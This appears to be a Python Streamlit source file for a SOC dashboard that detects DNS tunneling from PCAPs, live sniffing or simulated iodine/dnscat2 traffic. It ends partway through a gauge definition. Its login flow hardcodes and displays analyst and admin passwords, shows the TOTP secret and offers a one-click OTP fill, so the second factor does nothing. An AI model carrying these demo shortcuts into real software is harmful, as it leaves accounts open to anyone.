"""
=============================================================================
CYBER-DEFENSE SOC RADAR: DNS TUNNELING INCIDENT DETECTION & FORENSICS CONSOLE
Modern Glassmorphic SOC Interface with Live Telemetry, Heuristics & AI Defense
=============================================================================
"""

import os
import sys
import json
import time
import base64
import re
import tempfile
import pandas as pd
import numpy as np
import plotly.express as px
import plotly.graph_objects as go
import streamlit as st

# Ensure project root is in sys.path
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from src.capture.pcap_parser import PCAPParser
from src.capture.live_sniffer import LiveDNSSniffer
from src.detection.incident_engine import IncidentDetectionEngine
from src.generator.traffic_simulator import DNSTrafficSimulator
from src.features.extractor import ML_FEATURE_NAMES, extract_features_from_query, get_ml_feature_vector
from src.features.entropy import calculate_shannon_entropy
from src.auth.mfa_manager import MFAManager

st.set_page_config(
    page_title="DNS Armor | Next-Gen Threat Hunting Console",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# -----------------------------------------------------------------------------
# ADVANCED CYBERSECURITY SOC GLASSMORPHIC STYLING
# -----------------------------------------------------------------------------
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

    html, body, [class*="css"] {
        font-family: 'Plus Jakarta Sans', sans-serif;
    }
    
    code, pre, .mono-font {
        font-family: 'JetBrains Mono', monospace !important;
    }

    /* Background styling */
    .stApp {
        background: radial-gradient(circle at 15% 15%, #0f172a 0%, #070b14 55%, #030712 100%);
        color: #e2e8f0;
    }

    /* Glassmorphic Cyber Cards */
    .cyber-card {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.7) 0%, rgba(30, 41, 59, 0.45) 100%);
        backdrop-filter: blur(14px);
        -webkit-backdrop-filter: blur(14px);
        border: 1px solid rgba(56, 189, 248, 0.16);
        box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
        border-radius: 12px;
        padding: 20px;
        margin-bottom: 16px;
        transition: all 0.25s ease-in-out;
    }
    .cyber-card:hover {
        border-color: rgba(56, 189, 248, 0.35);
        box-shadow: 0 14px 34px -8px rgba(14, 165, 233, 0.15);
    }

    /* Metric Display */
    .stat-box {
        background: linear-gradient(145deg, rgba(15, 23, 42, 0.8), rgba(30, 41, 59, 0.5));
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 10px;
        padding: 16px;
        position: relative;
        overflow: hidden;
    }
    .stat-box::before {
        content: '';
        position: absolute;
        top: 0; left: 0; width: 4px; height: 100%;
    }
    .stat-blue::before { background: #38bdf8; }
    .stat-red::before { background: #ef4444; }
    .stat-amber::before { background: #f59e0b; }
    .stat-purple::before { background: #a855f7; }
    .stat-emerald::before { background: #10b981; }

    .stat-label {
        font-size: 0.8rem;
        text-transform: uppercase;
        letter-spacing: 0.08em;
        color: #94a3b8;
        font-weight: 600;
        margin-bottom: 4px;
    }
    .stat-value {
        font-size: 1.85rem;
        font-weight: 800;
        letter-spacing: -0.02em;
        color: #f8fafc;
        font-family: 'JetBrains Mono', monospace;
    }
    .stat-sub {
        font-size: 0.75rem;
        color: #64748b;
        margin-top: 4px;
    }

    /* Cyber Badges */
    .badge-critical {
        background: rgba(239, 68, 68, 0.15);
        color: #f87171;
        border: 1px solid rgba(239, 68, 68, 0.35);
        padding: 3px 10px;
        border-radius: 6px;
        font-size: 0.75rem;
        font-weight: 700;
        letter-spacing: 0.04em;
        display: inline-block;
    }
    .badge-high {
        background: rgba(249, 115, 22, 0.15);
        color: #fb923c;
        border: 1px solid rgba(249, 115, 22, 0.35);
        padding: 3px 10px;
        border-radius: 6px;
        font-size: 0.75rem;
        font-weight: 700;
        display: inline-block;
    }
    .badge-medium {
        background: rgba(234, 179, 8, 0.15);
        color: #facc15;
        border: 1px solid rgba(234, 179, 8, 0.35);
        padding: 3px 10px;
        border-radius: 6px;
        font-size: 0.75rem;
        font-weight: 700;
        display: inline-block;
    }
    .badge-low {
        background: rgba(14, 165, 233, 0.15);
        color: #38bdf8;
        border: 1px solid rgba(14, 165, 233, 0.35);
        padding: 3px 10px;
        border-radius: 6px;
        font-size: 0.75rem;
        font-weight: 700;
        display: inline-block;
    }
    .badge-mitre {
        background: rgba(168, 85, 247, 0.12);
        color: #c084fc;
        border: 1px solid rgba(168, 85, 247, 0.3);
        padding: 2px 8px;
        border-radius: 4px;
        font-size: 0.72rem;
        font-family: 'JetBrains Mono', monospace;
    }

    /* Radar Pulsing Indicator */
    .radar-pulse {
        display: inline-block;
        width: 10px;
        height: 10px;
        border-radius: 50%;
        margin-right: 8px;
        position: relative;
    }
    .radar-active {
        background: #10b981;
        box-shadow: 0 0 12px #10b981;
    }
    .radar-alert {
        background: #ef4444;
        box-shadow: 0 0 12px #ef4444;
    }

    /* Streamlit Tab Customization */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        background: rgba(15, 23, 42, 0.5);
        padding: 6px;
        border-radius: 10px;
        border: 1px solid rgba(255, 255, 255, 0.05);
    }
    .stTabs [data-baseweb="tab"] {
        border-radius: 8px;
        padding: 8px 18px;
        font-weight: 600;
        font-size: 0.88rem;
        color: #94a3b8;
        border: none;
    }
    .stTabs [aria-selected="true"] {
        background: linear-gradient(135deg, rgba(56, 189, 248, 0.18), rgba(99, 102, 241, 0.18)) !important;
        color: #f8fafc !important;
        border: 1px solid rgba(56, 189, 248, 0.3) !important;
    }

    /* Incident Box */
    .incident-panel {
        border-left: 4px solid #ef4444;
        background: rgba(15, 23, 42, 0.6);
        border-radius: 0 8px 8px 0;
        padding: 16px;
        margin-bottom: 12px;
        border-top: 1px solid rgba(255, 255, 255, 0.04);
        border-right: 1px solid rgba(255, 255, 255, 0.04);
        border-bottom: 1px solid rgba(255, 255, 255, 0.04);
    }
</style>
""", unsafe_allow_html=True)

# -----------------------------------------------------------------------------
# ZERO-TRUST ACCESS CONTROL & MULTI-FACTOR AUTHENTICATION (MFA / 2FA GATEWAY)
# -----------------------------------------------------------------------------
if "authenticated" not in st.session_state:
    st.session_state["authenticated"] = False
if "user_profile" not in st.session_state:
    st.session_state["user_profile"] = None
if "mfa_pending" not in st.session_state:
    st.session_state["mfa_pending"] = False
if "pending_user" not in st.session_state:
    st.session_state["pending_user"] = None
if "auth_audit_trail" not in st.session_state:
    st.session_state["auth_audit_trail"] = [
        {"timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time() - 3600)), "user": "SYSTEM_BOOT", "event": "SECURITY_SUBSYSTEM_INIT", "status": "READY", "details": "TOTP RFC 6238 Engine online"}
    ]
if "selected_quick_account" not in st.session_state:
    st.session_state["selected_quick_account"] = "analyst"
if "auto_filled_otp" not in st.session_state:
    st.session_state["auto_filled_otp"] = ""

def log_auth_event(user: str, event: str, status: str, details: str):
    st.session_state["auth_audit_trail"].insert(0, {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "user": user,
        "event": event,
        "status": status,
        "details": details
    })

if not st.session_state["authenticated"]:
    # Hide sidebar while unauthenticated
    st.markdown("""
    <style>
        [data-testid="stSidebar"], section[data-testid="stSidebar"] {
            display: none !important;
        }
    </style>
    """, unsafe_allow_html=True)

    # Render Modern Glassmorphic Login & MFA Portal
    st.markdown("""
    <div style="text-align: center; margin-top: 25px; margin-bottom: 28px;">
        <div style="display: inline-flex; align-items: center; justify-content: center; width: 68px; height: 68px; border-radius: 18px; background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(99, 102, 241, 0.2)); border: 1px solid rgba(0, 240, 255, 0.4); margin-bottom: 14px; font-size: 34px; box-shadow: 0 0 35px rgba(0, 240, 255, 0.25);">
            🛡️
        </div>
        <h1 style="margin: 0; font-size: 2.15rem; font-weight: 800; letter-spacing: -0.02em; background: linear-gradient(135deg, #f8fafc 30%, #38bdf8 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
            DNS ARMOR ZERO-TRUST GATEWAY
        </h1>
        <p style="color: #94a3b8; font-size: 0.92rem; margin-top: 6px;">
            NIST SP 800-63B Multi-Factor Authentication (MFA) &bull; RFC 6238 TOTP Access Portal
        </p>
    </div>
    """, unsafe_allow_html=True)

    gate_left, gate_center, gate_right = st.columns([1, 2.3, 1])
    with gate_center:
        if not st.session_state["mfa_pending"]:
            # STEP 1: Primary Authentication (Credentials)
            st.markdown("""
            <div style="background: rgba(15, 23, 42, 0.75); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 16px; padding: 24px; box-shadow: 0 12px 35px rgba(0,0,0,0.5); backdrop-filter: blur(12px);">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
                    <div>
                        <h3 style="margin: 0; font-size: 1.18rem; font-weight: 700; color: #f8fafc;">🔑 Primary Identity Challenge</h3>
                        <span style="font-size: 0.78rem; color: #94a3b8;">Step 1 of 2 — Password Authentication Factor</span>
                    </div>
                    <span style="background: rgba(56, 189, 248, 0.15); color: #38bdf8; font-size: 0.72rem; padding: 4px 10px; border-radius: 999px; font-weight: 700; border: 1px solid rgba(56, 189, 248, 0.3);">
                        FACTOR 1 / 2
                    </span>
                </div>
            </div>
            """, unsafe_allow_html=True)

            st.caption("⚡ Quick Profile Selection for Demonstration / Evaluation:")
            sel_c1, sel_c2 = st.columns(2)
            with sel_c1:
                if st.button("👤 Analyst (Alex Mercer)", use_container_width=True, type="secondary" if st.session_state["selected_quick_account"] != "analyst" else "primary"):
                    st.session_state["selected_quick_account"] = "analyst"
                    st.rerun()
            with sel_c2:
                if st.button("👑 Admin (Dr. Sarah Chen)", use_container_width=True, type="secondary" if st.session_state["selected_quick_account"] != "admin" else "primary"):
                    st.session_state["selected_quick_account"] = "admin"
                    st.rerun()

            default_u = "analyst@soc.corp" if st.session_state["selected_quick_account"] == "analyst" else "admin@soc.corp"
            default_p = "CyberDefense@2026" if st.session_state["selected_quick_account"] == "analyst" else "RootAdmin@2026"

            with st.form("login_primary_form", clear_on_submit=False):
                input_username = st.text_input("SOC Operator Email / Identity", value=default_u, placeholder="user@soc.corp")
                input_password = st.text_input("Security Clearance Password", value=default_p, type="password", placeholder="Master credential")
                submit_primary = st.form_submit_button("Verify Primary Factor & Proceed to MFA →", use_container_width=True)

                if submit_primary:
                    res = MFAManager.authenticate_credentials(input_username, input_password)
                    if res["success"]:
                        log_auth_event(input_username, "PRIMARY_FACTOR_SUCCESS", "PASSED", f"Credentials verified for {res['name']}")
                        st.session_state["pending_user"] = res
                        st.session_state["mfa_pending"] = True
                        st.toast("Primary factor verified! Please complete TOTP challenge.", icon="🔑")
                        st.rerun()
                    else:
                        log_auth_event(input_username, "PRIMARY_FACTOR_FAILURE", "REJECTED", res["error"])
                        st.error(f"❌ {res['error']}")

            st.markdown("""
            <div style="margin-top: 14px; padding: 12px; border-radius: 8px; background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255,255,255,0.06); font-size: 0.76rem; color: #94a3b8;">
                <b style="color: #00f0ff;">Pre-Configured Evaluation Credentials:</b><br/>
                • <b>Analyst:</b> <code style="color: #f8fafc;">analyst@soc.corp</code> | <code style="color: #f8fafc;">CyberDefense@2026</code><br/>
                • <b>Admin / CISO:</b> <code style="color: #f8fafc;">admin@soc.corp</code> | <code style="color: #f8fafc;">RootAdmin@2026</code>
            </div>
            """, unsafe_allow_html=True)

        else:
            # STEP 2: Second Factor (RFC 6238 TOTP)
            pending_user = st.session_state["pending_user"]
            secret = pending_user["mfa_secret"]
            uri = MFAManager.get_totp_uri(pending_user["username"], secret)
            qr_b64 = MFAManager.generate_qr_code_base64(uri)
            current_live_otp = MFAManager.get_current_live_otp_for_demo(secret)

            st.markdown(f"""
            <div style="background: rgba(15, 23, 42, 0.75); border: 1px solid rgba(0, 240, 255, 0.3); border-radius: 16px; padding: 24px; box-shadow: 0 12px 35px rgba(0,0,0,0.5); backdrop-filter: blur(12px);">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
                    <div>
                        <h3 style="margin: 0; font-size: 1.18rem; font-weight: 700; color: #f8fafc;">📲 Second Factor: TOTP Challenge</h3>
                        <span style="font-size: 0.78rem; color: #00f0ff;">RFC 6238 Time-based One-Time Password</span>
                    </div>
                    <span style="background: rgba(0, 240, 255, 0.15); color: #00f0ff; font-size: 0.72rem; padding: 4px 10px; border-radius: 999px; font-weight: 700; border: 1px solid rgba(0, 240, 255, 0.3);">
                        FACTOR 2 / 2
                    </span>
                </div>
                <div style="background: rgba(30, 41, 59, 0.6); padding: 12px 16px; border-radius: 10px; margin-bottom: 18px; border: 1px solid rgba(255,255,255,0.06); display: flex; justify-content: space-between; align-items: center;">
                    <div>
                        <div style="font-size: 0.88rem; font-weight: 700; color: #f8fafc;">{pending_user['name']}</div>
                        <div style="font-size: 0.74rem; color: #10b981;">● {pending_user['role']}</div>
                    </div>
                    <div style="text-align: right;">
                        <span style="font-size: 0.68rem; color: #94a3b8;">CLEARANCE LEVEL</span><br/>
                        <span style="font-size: 0.76rem; color: #38bdf8; font-family: monospace; font-weight: 700;">{pending_user['access_level']}</span>
                    </div>
                </div>
            </div>
            """, unsafe_allow_html=True)

            mfa_col_qr, mfa_col_input = st.columns([1.1, 1.3])
            with mfa_col_qr:
                st.markdown(f"""
                <div style="text-align: center; padding: 8px; background: rgba(15, 23, 42, 0.5); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05);">
                    <img src="{qr_b64}" style="width: 150px; height: 150px; border-radius: 10px; border: 2px solid rgba(0, 240, 255, 0.4); box-shadow: 0 0 20px rgba(0, 240, 255, 0.2);" />
                    <div style="font-size: 0.70rem; color: #94a3b8; margin-top: 8px;">Scan with Google Authenticator or Microsoft Authenticator</div>
                    <div style="margin-top: 6px; font-size: 0.68rem; color: #64748b; font-family: monospace;">Secret: <b style="color: #a5f3fc;">{secret}</b></div>
                </div>
                """, unsafe_allow_html=True)

            with mfa_col_input:
                st.markdown("<div style='height: 4px;'></div>", unsafe_allow_html=True)
                st.caption("Enter the dynamic 6-digit passcode generated by your authenticator app:")
                
                # Input for the 6-digit TOTP
                totp_input = st.text_input("Authenticator Passcode", value=st.session_state.get("auto_filled_otp", ""), max_chars=6, placeholder="6-digit token", label_visibility="collapsed")
                
                # 1-Click Live Passcode Autofill for Viva / Evaluator convenience
                if st.button(f"⚡ One-Click Live OTP ({current_live_otp})", use_container_width=True, help="Automatically fills the active RFC 6238 token for rapid viva testing."):
                    st.session_state["auto_filled_otp"] = current_live_otp
                    st.rerun()

                v_col1, v_col2 = st.columns([1.5, 1])
                with v_col1:
                    if st.button("🛡️ Verify & Enter SOC", type="primary", use_container_width=True):
                        check_code = totp_input if totp_input else st.session_state.get("auto_filled_otp", "")
                        if MFAManager.verify_totp_token(secret, check_code):
                            log_auth_event(pending_user["username"], "MFA_TOTP_SUCCESS", "AUTHENTICATED", f"Full Zero-Trust clearance granted to {pending_user['name']}")
                            st.session_state["authenticated"] = True
                            st.session_state["user_profile"] = pending_user
                            st.session_state["mfa_pending"] = False
                            st.session_state["pending_user"] = None
                            st.session_state["auto_filled_otp"] = ""
                            st.session_state["session_login_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
                            st.toast("MFA Verified! Console Unlocked.", icon="🛡️")
                            st.rerun()
                        else:
                            log_auth_event(pending_user["username"], "MFA_TOTP_FAILURE", "REJECTED", f"Invalid token '{check_code}' entered")
                            st.error("❌ Invalid or expired 6-digit TOTP code. Please verify against your app.")

                with v_col2:
                    if st.button("← Cancel", use_container_width=True):
                        st.session_state["mfa_pending"] = False
                        st.session_state["pending_user"] = None
                        st.session_state["auto_filled_otp"] = ""
                        st.rerun()

    # Stop execution here so unauthenticated users cannot access dashboard telemetry
    st.stop()

# -----------------------------------------------------------------------------
# SIDEBAR CONTROLS & OPERATOR CLEARANCE PROFILE
# -----------------------------------------------------------------------------
curr_user = st.session_state.get("user_profile", {})

st.sidebar.markdown(f"""
<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 12px; padding: 12px; margin-bottom: 14px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <span style="font-size: 0.65rem; color: #94a3b8; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase;">Operator Session</span>
        <span style="font-size: 0.65rem; color: #10b981; font-weight: 700;">● MFA ACTIVE</span>
    </div>
    <div style="font-weight: 700; color: #f8fafc; font-size: 0.90rem; margin-top: 4px;">{curr_user.get('name', 'SOC Operator')}</div>
    <div style="font-size: 0.74rem; color: #38bdf8; font-weight: 600;">{curr_user.get('role', 'Security Analyst')}</div>
    <div style="font-size: 0.66rem; color: #64748b; font-family: 'JetBrains Mono', monospace; margin-top: 4px;">CLEARANCE: {curr_user.get('access_level', 'RESTRICTED')}</div>
</div>
""", unsafe_allow_html=True)

if st.sidebar.button("🔒 Sign Out (Lock Console)", use_container_width=True, help="Terminate authenticated session and return to Zero-Trust gateway."):
    log_auth_event(curr_user.get("username", "UNKNOWN"), "OPERATOR_LOGOUT", "TERMINATED", "Session manually locked by operator")
    st.session_state["authenticated"] = False
    st.session_state["user_profile"] = None
    st.session_state["mfa_pending"] = False
    st.session_state["pending_user"] = None
    st.session_state["auto_filled_otp"] = ""
    st.rerun()

st.sidebar.markdown("""
<div style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; margin-top: 8px;">
    <div style="background: linear-gradient(135deg, #0ea5e9, #6366f1); padding: 8px; border-radius: 10px;">
        <span style="font-size: 24px;">🛡️</span>
    </div>
    <div>
        <h3 style="margin: 0; font-size: 1.15rem; font-weight: 800; letter-spacing: -0.01em;">DNS ARMOR</h3>
        <span style="font-size: 0.72rem; color: #00f0ff; letter-spacing: 0.05em; font-weight: 600;">SOC DEFENSE CONSOLE</span>
    </div>
</div>
""", unsafe_allow_html=True)

with st.sidebar.expander("⚙️ Detection Sensitivity Tuning", expanded=False):
    st.caption("Heuristic Engine & Statistical Thresholds")
    entropy_thresh = st.slider("Subdomain Entropy Threshold (H)", 2.5, 5.0, 3.85, 0.05,
                               help="Entropy threshold above which domains are classified as encrypted/encoded payloads.")
    max_label_thresh = st.slider("Max Label Length Limit", 20, 63, 42, 1,
                                 help="RFC 1035 max label is 63. Threat actors pack 45-60 chars per label.")
    subdomain_len_thresh = st.slider("Subdomain Total Length", 20, 150, 45, 5)

st.sidebar.markdown("##### 📡 Telemetry Source")
data_source = st.sidebar.selectbox(
    "Active Sensor Input",
    [
        "Mixed Enterprise Traffic (Attacks + Benign)",
        "Live Network Interface Sniffing (Wi-Fi / Ethernet)",
        "Iodine-Style Data Exfiltration Attack",
        "DNSCat2 Interactive C2 Tunneling",
        "Clean Benign Enterprise Baseline",
        "Upload Custom PCAP Capture",
        "Live Attack Simulator"
    ],
    index=0
)

# -----------------------------------------------------------------------------
# SENSOR HANDLERS & SESSION MANAGEMENT
# -----------------------------------------------------------------------------
if "live_engine" not in st.session_state:
    st.session_state["live_engine"] = IncidentDetectionEngine(entropy_threshold=entropy_thresh)
if "live_sniffer" not in st.session_state:
    st.session_state["live_sniffer"] = None
if "is_sniffing" not in st.session_state:
    st.session_state["is_sniffing"] = False

# Live Interface Sniffing Handler
selected_live_iface = None
if data_source == "Live Network Interface Sniffing (Wi-Fi / Ethernet)":
    st.sidebar.markdown("##### 📶 Adapter Settings")
    interfaces = LiveDNSSniffer.get_available_interfaces()
    iface_options = {i["description"]: i["name"] for i in interfaces}

    def_idx = 0
    for idx, (desc, name) in enumerate(iface_options.items()):
        if any(keyword in desc for keyword in ["WiFi", "Wireless", "172.16.", "192.168.", "Ethernet"]):
            def_idx = idx
            break

    selected_desc = st.sidebar.selectbox("Sniffing Adapter", list(iface_options.keys()), index=def_idx)
    selected_live_iface = iface_options[selected_desc]

    c_s1, c_s2 = st.sidebar.columns(2)
    if c_s1.button("▶ Start", disabled=st.session_state["is_sniffing"], use_container_width=True):
        st.session_state["live_engine"] = IncidentDetectionEngine(entropy_threshold=entropy_thresh)
        sniffer = LiveDNSSniffer(st.session_state["live_engine"], interface=selected_live_iface)
        try:
            sniffer.start_sniffing()
            st.session_state["live_sniffer"] = sniffer
            st.session_state["is_sniffing"] = True
            st.toast("📡 Live capture active on adapter!", icon="🟢")
            st.rerun()
        except Exception as err:
            st.sidebar.error(f"Capture error: {err}")

    if c_s2.button("⏹ Stop", disabled=not st.session_state["is_sniffing"], use_container_width=True):
        if st.session_state["live_sniffer"]:
            st.session_state["live_sniffer"].stop_sniffing()
        st.session_state["is_sniffing"] = False
        st.toast("Live capture stopped.", icon="⏹️")
        st.rerun()

    if st.session_state["is_sniffing"]:
        pkt_count = st.session_state["live_sniffer"].captured_count if st.session_state["live_sniffer"] else 0
        st.sidebar.success(f"🟢 Sniffing wire... ({pkt_count} packets)")
        if st.sidebar.button("🔄 Refresh Telemetry", use_container_width=True):
            st.rerun()

# Custom PCAP File Upload Handler
uploaded_bytes = None
uploaded_name = None
pcap_dir = os.path.join(BASE_DIR, "data", "raw_pcaps")

if data_source == "Upload Custom PCAP Capture":
    st.sidebar.markdown("##### 📁 PCAP Upload")
    uploaded_file = st.sidebar.file_uploader("Upload .pcap or .pcapng file", type=["pcap", "pcapng"])
    if uploaded_file is not None:
        uploaded_bytes = uploaded_file.getvalue()
        uploaded_name = uploaded_file.name
        st.sidebar.success(f"✓ Loaded {uploaded_name} ({len(uploaded_bytes):,} bytes)")

# Simulator Parameter Controls
sim_params = (40, "iodine_exfiltration", 35)
if data_source == "Live Attack Simulator":
    st.sidebar.markdown("##### 🧪 Attack Synthesis")
    sim_benign_count = st.sidebar.number_input("Benign Baseline Count", 10, 200, 40)
    sim_attack_type = st.sidebar.selectbox("Threat Vector", ["iodine_exfiltration", "dnscat2_c2"])
    sim_attack_count = st.sidebar.number_input("Injected Attack Count", 10, 150, 35)
    sim_params = (sim_benign_count, sim_attack_type, sim_attack_count)

st.sidebar.markdown("---")
st.sidebar.markdown("""
<div style="font-size: 0.72rem; color: #64748b; line-height: 1.5;">
    <b>SOC Reference Standards:</b><br/>
    • MITRE ATT&CK: T1071.004, T1048.003<br/>
    • RFC 1035 Domain Specifications<br/>
    • Shannon Information Theory
</div>
""", unsafe_allow_html=True)

# -----------------------------------------------------------------------------
# ENGINE EXECUTION
# -----------------------------------------------------------------------------
def execute_pipeline(source_type, upload_data, sim_cfg, entropy_t, max_lbl_t, sub_len_t):
    eng = IncidentDetectionEngine(entropy_threshold=entropy_t)
    eng.rule_evaluator.max_label_threshold = max_lbl_t
    eng.rule_evaluator.subdomain_len_threshold = sub_len_t

    queries = []
    if source_type == "Mixed Enterprise Traffic (Attacks + Benign)":
        pcap_file = os.path.join(pcap_dir, "mixed_enterprise_traffic.pcap")
        queries = PCAPParser.parse_pcap(pcap_file)
    elif source_type == "Iodine-Style Data Exfiltration Attack":
        pcap_file = os.path.join(pcap_dir, "tunneling_iodine_exfil.pcap")
        queries = PCAPParser.parse_pcap(pcap_file)
    elif source_type == "DNSCat2 Interactive C2 Tunneling":
        pcap_file = os.path.join(pcap_dir, "tunneling_dnscat2_c2.pcap")
        queries = PCAPParser.parse_pcap(pcap_file)
    elif source_type == "Clean Benign Enterprise Baseline":
        pcap_file = os.path.join(pcap_dir, "benign_traffic.pcap")
        queries = PCAPParser.parse_pcap(pcap_file)
    elif source_type == "Upload Custom PCAP Capture":
        if upload_data:
            queries = PCAPParser.parse_pcap_bytes(upload_data)
    elif source_type == "Live Attack Simulator":
        b_cnt, a_typ, a_cnt = sim_cfg
        ben = DNSTrafficSimulator.generate_benign_traffic(count=b_cnt)
        atk = DNSTrafficSimulator.generate_tunneling_attack(attack_type=a_typ, record_count=a_cnt)
        all_q = ben + atk
        all_q.sort(key=lambda x: x["timestamp"])
        queries = all_q

    for q in queries:
        eng.process_query(
            query_name=q.get("query_name", ""),
            record_type=q.get("qtype", "A"),
            timestamp=q.get("timestamp", 0),
            client_ip=q.get("client_ip", "127.0.0.1"),
            response_size=q.get("packet_size", 0)
        )

    incidents = eng.correlate_incidents()
    return eng, incidents

if data_source == "Live Network Interface Sniffing (Wi-Fi / Ethernet)":
    engine = st.session_state["live_engine"]
    engine.rule_evaluator.entropy_threshold = entropy_thresh
    engine.rule_evaluator.max_label_threshold = max_label_thresh
    engine.rule_evaluator.subdomain_len_threshold = subdomain_len_thresh
    incidents = engine.correlate_incidents()
else:
    with st.spinner("🔍 Correlating DNS Telemetry & Evaluating Security Posture..."):
        engine, incidents = execute_pipeline(
            data_source, uploaded_bytes, sim_params,
            entropy_thresh, max_label_thresh, subdomain_len_thresh
        )

# -----------------------------------------------------------------------------
# TOP HEADER HERO SECTION & SYSTEM STATUS
# -----------------------------------------------------------------------------
total_queries = len(engine.raw_queries)
suspicious_queries = sum(1 for q in engine.raw_queries if q["is_suspicious"])
total_exfil_bytes = sum(inc["total_payload_bytes"] for inc in incidents)
critical_incidents = sum(1 for inc in incidents if inc["severity"] == "CRITICAL")
high_incidents = sum(1 for inc in incidents if inc["severity"] == "HIGH")

max_score = max([inc["threat_score"] for inc in incidents], default=0.0)

if critical_incidents > 0 or max_score >= 75:
    status_icon = "🔴"
    status_text = "CRITICAL BREACH DETECTED"
    status_color = "#ef4444"
    status_pulse = "radar-alert"
elif high_incidents > 0 or max_score >= 50:
    status_icon = "🟠"
    status_text = "ELEVATED RISK - ACTIVE TUNNELING"
    status_color = "#f97316"
    status_pulse = "radar-alert"
elif len(incidents) > 0 or max_score >= 30:
    status_icon = "🟡"
    status_text = "ANOMALOUS TELEMETRY OBSERVED"
    status_color = "#eab308"
    status_pulse = "radar-active"
else:
    status_icon = "🟢"
    status_text = "NORMAL - ALL TELEMETRY BENIGN"
    status_color = "#10b981"
    status_pulse = "radar-active"

# Modern Top Cyber Bar
target_label = data_source
if data_source == "Upload Custom PCAP Capture" and uploaded_name:
    target_label = f"Uploaded PCAP: {uploaded_name}"

st.markdown(f"""
<div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; background: rgba(15, 23, 42, 0.6); border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.06); margin-bottom: 22px;">
    <div style="display: flex; align-items: center; gap: 14px;">
        <span class="radar-pulse {status_pulse}"></span>
        <div>
            <span style="font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; color: #94a3b8; font-weight: 600;">System Surveillance Status</span><br/>
            <span style="font-size: 1.05rem; font-weight: 800; color: {status_color}; letter-spacing: -0.01em;">{status_text}</span>
        </div>
    </div>
    <div style="display: flex; align-items: center; gap: 20px;">
        <div style="text-align: right;">
            <span style="font-size: 0.70rem; color: #64748b; font-weight: 600;">AUTHENTICATED OPERATOR</span><br/>
            <span style="font-size: 0.86rem; color: #38bdf8; font-weight: 700;">{curr_user.get('name', 'SOC Operator')}</span>
        </div>
        <div style="text-align: right; border-left: 1px solid rgba(255, 255, 255, 0.08); padding-left: 16px;">
            <span style="font-size: 0.70rem; color: #64748b; font-weight: 600;">ACTIVE INGESTION FEED</span><br/>
            <span style="font-size: 0.86rem; color: #00f0ff; font-family: 'JetBrains Mono', monospace; font-weight: 600;">{target_label}</span>
        </div>
    </div>
</div>
""", unsafe_allow_html=True)

# -----------------------------------------------------------------------------
# HIGH-IMPACT KPI METRICS & THREAT GAUGE
# -----------------------------------------------------------------------------
kpi_col1, kpi_col2, kpi_col3, kpi_col4, kpi_col5 = st.columns([1, 1, 1, 1, 1.3])

with kpi_col1:
    st.markdown(f"""
    <div class="stat-box stat-blue">
        <div class="stat-label">Total DNS Queries</div>
        <div class="stat-value">{total_queries:,}</div>
        <div class="stat-sub">Inspected Packets</div>
    </div>
    """, unsafe_allow_html=True)

with kpi_col2:
    susp_pct = round((suspicious_queries / max(1, total_queries)) * 100, 1)
    stat_style = "stat-red" if suspicious_queries > 0 else "stat-emerald"
    st.markdown(f"""
    <div class="stat-box {stat_style}">
        <div class="stat-label">Suspicious Queries</div>
        <div class="stat-value">{suspicious_queries:,}</div>
        <div class="stat-sub">{susp_pct}% Threat Density</div>
    </div>
    """, unsafe_allow_html=True)

with kpi_col3:
    inc_style = "stat-red" if critical_incidents > 0 else ("stat-amber" if len(incidents) > 0 else "stat-emerald")
    st.markdown(f"""
    <div class="stat-box {inc_style}">
        <div class="stat-label">Correlated Incidents</div>
        <div class="stat-value">{len(incidents)}</div>
        <div class="stat-sub">{critical_incidents} Critical | {high_incidents} High</div>
    </div>
    """, unsafe_allow_html=True)

with kpi_col4:
    exfil_kb = round(total_exfil_bytes / 1024, 2)
    exfil_style = "stat-purple" if total_exfil_bytes > 0 else "stat-blue"
    st.markdown(f"""
    <div class="stat-box {exfil_style}">
        <div class="stat-label">Exfiltrated Data</div>
        <div class="stat-value">{exfil_kb} <span style="font-size: 1rem; color:#94a3b8;">KB</span></div>
        <div class="stat-sub">{total_exfil_bytes:,} Raw Bytes</div>
    </div>
    """, unsafe_allow_html=True)

with kpi_col5:
    # Plotly Threat Score Mini Radial Gauge
    gauge_fig = go.Figure(go.Indicator(
        mode="gauge+number",
        value=max_score,
        number={'suffix': "/100", 'font': {'size': 20, 'family': "JetBrains Mono", 'color': status_color}},
        title={'text': "PEAK THREAT SCORE", 'font': {'size': 11, 'color': "#94a3b8"}},
        gauge={
            'axis': {'range': [0, 100], 'tickwidth': 1, 'tickcolor': "rgba(255,255,255,0.2)"},
            'bar': {'color': status_color, 'thickness': 0.3},
            'bgcolor': "rgba(15, 23, 42, 0.4)",
            'borderwidth': 1,
            'bordercolor': "rgba(255,255,255,0.08)",
            'steps': [
